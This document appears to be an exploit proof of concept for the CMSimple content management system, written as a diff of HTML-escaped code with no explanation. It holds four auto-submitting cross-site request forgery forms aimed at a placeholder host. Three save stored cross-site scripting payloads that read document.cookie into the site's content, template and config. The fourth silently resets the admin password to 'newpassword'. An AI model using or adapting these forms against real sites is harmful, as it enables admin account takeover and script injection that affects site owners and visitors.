@@ -1,0 +1,102 @@
+&lt;form action=&quot;http://www.example.com/&quot; method=&quot;post&quot; name=&quot;main&quot; &gt;
+&lt;input type=&quot;hidden&quot; name=&quot;text&quot; value='&lt;html&gt;&lt;head&gt;&lt;title&gt;The name of the site - Content&lt;/title&gt;&lt;meta name=&quot;keywords&quot; content=&quot;key&quot;&gt;&lt;meta name=&quot;description&quot; content=&quot;description&quot;&gt;&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=UTF-8&quot;&gt;&lt;link rel=&quot;stylesheet&quot; href=&quot;./templates/default/stylesheet.css&quot; type=&quot;text/css&quot;&gt;&lt;/head&gt;&lt;body&gt;&lt;H1&gt;Welcome&lt;/H1&gt;&lt;P&gt;code and &lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;/P&gt;&lt;/body&gt;&lt;/html&gt;' /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;file&quot; value=&quot;content&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;action&quot; value=&quot;save&quot; /&gt;
+&lt;/form&gt;
+&lt;script&gt;
+document.main.submit();
+&lt;/script&gt;
+
+
+
+&lt;form action=&quot;http://www.example.com/&quot; method=&quot;post&quot; name=&quot;main&quot; &gt;
+
+&lt;input type=&quot;hidden&quot; name=&quot;text&quot; value='php and html code of template&lt;script&gt;alert(document.cookie)&lt;/script&gt;' /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;file&quot; value=&quot;template&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;action&quot; value=&quot;save&quot; /&gt;
+
+&lt;/form&gt;
+&lt;script&gt;
+document.main.submit();
+&lt;/script&gt;
+
+
+
+&lt;form action=&quot;http://www.example.com/&quot; method=&quot;post&quot; name=&quot;main&quot; &gt;
+
+&lt;input type=&quot;hidden&quot; name=&quot;security_password&quot; value=&quot;test&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;security_type&quot; value=&quot;page&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;site_title&quot; value='CMSimple site&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;' /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;site_template&quot; value=&quot;default&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;language_default&quot; value=&quot;ru&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;meta_keywords&quot; value=&quot;CMSimple, Content Management System, php&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;meta_description&quot; value=&quot;CMSimple is a content management system&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;backup_numberoffiles&quot; value=&quot;5&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;images_maxsize&quot; value=&quot;150000&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;downloads_maxsize&quot; value=&quot;1000000&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;mailform_email=&quot; value=&quot;&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;editor_height&quot; value=&quot;(screen.availHeight)-400&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;editor_external&quot; value=&quot;&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;menu_color&quot; value=&quot;000000&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;menu_highlightcolor&quot; value=&quot;808080&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;menu_levels&quot; value=&quot;3&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;menu_levelcatch&quot; value=&quot;10&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;menu_sdoc&quot; value=&quot;&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;menu_legal&quot; value=&quot;CMSimple Legal Notices&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;uri_seperator&quot; value=&quot;:&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;uri_length&quot; value=&quot;200&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;xhtml_endtags&quot; value=&quot;&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;xhtml_amp&quot; value=&quot;true&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;plugins_folder&quot; value=&quot;&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;functions_file&quot; value=&quot;functions.php&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;scripting_regexp&quot; value=&quot;\#CMSimple (.*?)\#&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;form&quot; value=&quot;array&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;file&quot; value=&quot;config&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;action&quot; value=&quot;save&quot; /&gt;
+
+&lt;/form&gt;
+&lt;script&gt;
+document.main.submit();
+&lt;/script&gt;
+
+
+
+&lt;form action=&quot;http://www.example.com/&quot; method=&quot;post&quot; name=&quot;main&quot; &gt;
+
+&lt;input type=&quot;hidden&quot; name=&quot;security_password&quot; value=&quot;newpassword&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;security_type&quot; value=&quot;page&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;site_title&quot; value='CMSimple site' /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;site_template&quot; value=&quot;default&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;language_default&quot; value=&quot;ru&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;meta_keywords&quot; value=&quot;CMSimple, Content Management System, php&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;meta_description&quot; value=&quot;CMSimple is a content management system&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;backup_numberoffiles&quot; value=&quot;5&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;images_maxsize&quot; value=&quot;150000&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;downloads_maxsize&quot; value=&quot;1000000&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;mailform_email=&quot; value=&quot;&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;editor_height&quot; value=&quot;(screen.availHeight)-400&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;editor_external&quot; value=&quot;&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;menu_color&quot; value=&quot;000000&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;menu_highlightcolor&quot; value=&quot;808080&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;menu_levels&quot; value=&quot;3&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;menu_levelcatch&quot; value=&quot;10&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;menu_sdoc&quot; value=&quot;&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;menu_legal&quot; value=&quot;CMSimple Legal Notices&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;uri_seperator&quot; value=&quot;:&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;uri_length&quot; value=&quot;200&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;xhtml_endtags&quot; value=&quot;&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;xhtml_amp&quot; value=&quot;true&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;plugins_folder&quot; value=&quot;&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;functions_file&quot; value=&quot;functions.php&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;scripting_regexp&quot; value=&quot;\#CMSimple (.*?)\#&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;form&quot; value=&quot;array&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;file&quot; value=&quot;config&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;action&quot; value=&quot;save&quot; /&gt;
+
+&lt;/form&gt;
+&lt;script&gt;
+document.main.submit();
+&lt;/script&gt;
+
+
+
